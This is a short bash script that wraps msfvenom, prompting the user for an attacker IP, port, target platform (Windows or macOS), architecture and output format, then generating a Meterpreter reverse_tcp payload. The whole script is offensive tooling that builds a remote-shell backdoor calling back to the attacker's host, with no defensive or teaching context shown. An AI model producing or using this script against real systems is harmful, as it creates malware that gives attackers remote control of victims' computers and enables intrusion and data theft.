
#!/bin/bash
function payload(){
	msfvenom -p $os/$arch_type/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $format -o $payload_name
}
echo 'your ip'
read LHOST
echo 'open port'
read LPORT
echo 'payload name'
read payload_name
echo 'which plateform (windows osx)'
read os
echo 'arch (x64 x86)'
read arch_type
echo 'format'
read format

payload
